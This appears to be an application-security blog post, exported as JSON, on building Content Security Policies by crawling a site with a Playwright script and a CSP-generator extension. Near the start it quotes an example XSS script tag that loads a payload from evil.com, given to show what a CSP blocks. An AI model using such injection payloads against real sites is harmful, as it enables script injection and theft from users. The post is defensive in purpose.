[{"categories":null,"contents":"What\u0026rsquo;s a CSP? One of the mitigating defenses for XSS attacks and Clickjacking attacks is a good Content Security Policy (CSP). While not a pancea, it can effectively limit the severity of any exploits by constraining the XSS payload size to the injection window, which is typically limited to a few characters. Instead of externally loading a payload like:\n\u0026lt;script src=\u0026#34;https://evil.com/payload.js\u0026#34;/\u0026gt; the entire payload must be encoded in the script evaluation window, effectively preventing nasty frameworks like BeEF from being loaded.\n  if (document.querySelector('body').getAttribute('class') != \"dark\") { document.querySelectorAll('.mermaidspan').forEach(el = { el.innerHTML = '\\nsequenceDiagram\\n Browser-\\x3e\\x3e\\x2bServer: REQUEST https:\\/\\/example.com\\/assets\\/js\\/lib.js \\n Server--\\x3e\\x3e\\x2bBrowser: 200 OK\\n Browser-\\x3e\\x3e\\x2bServer: REQUEST https:\\/\\/example.com\\/static\\/img\\/kitty.jpg\\n Server--\\x3e\\x3e\\x2bBrowser: 200 OK\\n Note over Server,Browser: Content-Security-Policy:\\x3cbr\\x3edefault-src https:\\/\\/example.com \\n Browser-\\x3e\\x3e\\x2bServer: REQUEST https:\\/\\/evil.org\\/xss.js\\n Server--\\x3e\\x3e-Browser: 400 Not Allowed (blocked:csp)\\n' }) } else { document.querySelectorAll('.mermaidspan').forEach(el = { el.innerHTML = '\\nsequenceDiagram\\n Browser-\\x3e\\x3e\\x2bServer: REQUEST https:\\/\\/example.com\\/assets\\/js\\/lib.js \\n Server--\\x3e\\x3e\\x2bBrowser: 200 OK\\n Browser-\\x3e\\x3e\\x2bServer: REQUEST https:\\/\\/example.com\\/static\\/img\\/kitty.jpg\\n Server--\\x3e\\x3e\\x2bBrowser: 200 OK\\n Note over Server,Browser: Content-Security-Policy:\\x3cbr\\x3edefault-src https:\\/\\/example.com \\n Browser-\\x3e\\x3e\\x2bServer: REQUEST https:\\/\\/evil.org\\/xss.js\\n Server--\\x3e\\x3e-Browser: 400 Not Allowed (blocked:csp)\\n' }) }   CSP\u0026rsquo;s work by essentially \u0026ldquo;whitelisting\u0026rdquo; externally loaded content. If evil.com is not whitelisted for loading scripts, scripts from evil.com cannot be loaded into the site. Sounds great, right? Unfortunately, the reality is that CSPs are only enforced on 7% of the Alexa Top 1M sites.\nWhy is this? If you\u0026rsquo;ve ever tried implementing a CSP on a non-trivial site, you\u0026rsquo;ll know the number one difficulty is breaking the site by preventing legitimate content from being loaded\u0026ndash; oftentime on pages you never expected to have content on. It\u0026rsquo;s no wonder top site owners are slow to implement CSPs.\nGiven an existing sites with tons of legacy content, how does one go about finding the specific external sources for each CSP directive? One answer could be opening up devtools and browsing a few pages of the site, then writing it by hand. This might be fine for a single tiny site. But what if you have an entire company\u0026rsquo;s worth of large sites to handle?\n TLDR: Use my Playwright script to generate comprehensive CSP\u0026rsquo;s quickly.\n Content Security Policy Generator (Chrome Extension) Luckily for us, there is a chrome extension called Content Security Policy (CSP) Generator which will help us generate a CSP on all visited links.\nHowever, we still need to visit all the links. You could click them all manually, but that would also take you ages. Besides, don\u0026rsquo;t you have more important things to do, such as sitting in meetings? Browser automation to the rescue!\nPlaywright I\u0026rsquo;ll be using Playwright, which is typically used to control a full browser via the Chrome DevTools protocol for QA testing purposes. It\u0026rsquo;s a fork of Puppeeteer. I prefer to use Playwright, due to it\u0026rsquo;s more user-friendly selector engine.\nThe advantage of using a full browser to crawl our site is that all dynamic content will be loaded. In this day and age, almost all sites are built using some javascript framework, which means a full browser is necessary to load all content for the Chrome extension to evaluate, leading to a more airtight CSP.\nWriting the script Downloading the chrome extension Instead of downloading the chrome extension by going to the web store, we will use curl to download the .crx source file. This is so we can load our plugin into playwright after we unzip it.\nWe will also use a free CORS reverse proxy called CORS Anywhere, in order to bypass the Chrome webstore\u0026rsquo;s security policy. If we don\u0026rsquo;t do this, the resulting response body will be empty.\nextension_id=\u0026#34;ahlnecfloencbkpfnpljbojmjkfgnmdc\u0026#34; curl -s -L -o \u0026#34;./csper.zip\u0026#34; \u0026#34;https://cors-anywhere.herokuapp.com/https://clients2.google.com/service/update2/crx?response=redirect\u0026amp;os=win\u0026amp;arch=x86-64\u0026amp;os_arch=x86-64\u0026amp;nacl_arch=x86-64\u0026amp;prod=chromiumcrx\u0026amp;prodchannel=unknown\u0026amp;prodversion=9999.0.9999.0\u0026amp;acceptformat=crx2,crx3\u0026amp;x=id%3D${extension_id}%26uc\u0026#34; \\  -H \u0026#39;Origin: https://robwu.nl\u0026#39;\\  -H \u0026#39;Referer: https://robwu.nl/\u0026#39;\\  unzip -d \u0026#34;csper-src\u0026#34; \u0026#34;csper.zip\u0026#34; Loading the CSPer extension into Playwright Here, we provide some additional args to load the extension directory we just downloaded into Chrome. Note that we need to turn off headess mode for extensions to work.\n(async () =\u0026gt; { const pathToExtension = require(\u0026#39;path\u0026#39;).join(__dirname, \u0026#39;csper-src\u0026#39;); const userDataDir = \u0026#39;./user-data-dir\u0026#39;; const browserContext = await chromium.launchPersistentContext(userDataDir,{ headless: false, args: [ `--disable-extensions-except=${pathToExtension}`, `--load-extension=${pathToExtension}` ] }); // get url to load from command line  cspUrl = process.argv.slice(2)[0] const page = await browserContext.newPage(); await page.goto(cspUrl) })() Crawling each page recursively In our playwright file, we define a function crawl() which will take a URL, scrape all \u0026lt;a href=\u0026quot;\u0026quot;/\u0026gt; links off the page. This function uses another function called waitForNetworkSettled(), taken from this gist. It\u0026rsquo;s basically an alternative to page.waitForNavigation({ waitUntil: \u0026quot;networkidle\u0026quot;})), which waits until the page loads. In my experience, the native function is buggy and resolves too early, so I had to use an alternative.\nconst seenURLs = new Set() const crawl = async (url) =\u0026gt; { // don\u0026#39;t recrawl pages alrady visited  if (seenURLs.has(url)) { return } // only crawl pages that are within our base domain  seenURLs.add(url) if (!url.startsWith(cspUrl)) { return } // don\u0026#39;t crawl documents  if (url.endsWith(\u0026#34;.pdf\u0026#34;) || url.endsWith(\u0026#34;.docx\u0026#34;) || url.endsWith(\u0026#34;.xlsx\u0026#34;)) { return } // define a request function that will wait until the page is loaded \t// will also scroll down to handle lazy-loaded items  const doRequest = waitForNetworkSettled(page, async () =\u0026gt; { await page.goto(url, { waitutil: \u0026#39;domcontentloaded\u0026#39; }) await page.evaluate(() =\u0026gt; window.scrollTo(0, (document.body.scrollHeight/3))); }) // race the request function with a timeout function \t// this will allow page that don\u0026#39;t stop loading assets to continue  await Promise.race([ doRequest, new Promise((_, reject) =\u0026gt; setTimeout(() =\u0026gt; reject(new Error(\u0026#39;timeout\u0026#39;)), 11.5e3)) ]).catch() try { // scrape new URLS off the page  const urls = await page.$$eval(\u0026#39;a\u0026#39;, (elements) =\u0026gt; elements.map((el) =\u0026gt; el.href), ) // recursively crawl them  for await (const u of urls) { await crawl(u) } } catch {} } Generating our CSP First, run the program.\nnode generate.js \u0026#34;https://polb.com\u0026#34; When the browser loads, click on the extension icon and start a new recording.\nThen, press enter to start recursively visiting all the URLs with the script.\n  Be mindful of being banned if there is an anti-bot service running on the site. Set a delay between page loads if necessary.\nWhen it is done, generate your new CSP policy.\nDon\u0026rsquo;t forget to remove any inline scripts from your site.\nDeploying the CSP Voila! you are done. Now go deploy your CSP by adding the\nContent-Security-Policy: \u0026#34;your_generated_csp\u0026#34; header to your site, if you have control over the server.\nIf you have control over the content, but not the server, you can add this html tag:\n\u0026lt;meta http-equiv=”Content-Security-Policy” content=”\u0026lt;your_generated_csp\u0026gt;”/\u0026gt; Hopefully this saves you some time. Source code here if you\u0026rsquo;d like to use it.\n","date":"04","image":null,"permalink":"https://deoxy.net/blog/csp/csp/","tags":["playwright","js","content security policy","appsec"],"title":"Implementing Content Security Policies, The Easy Way."}]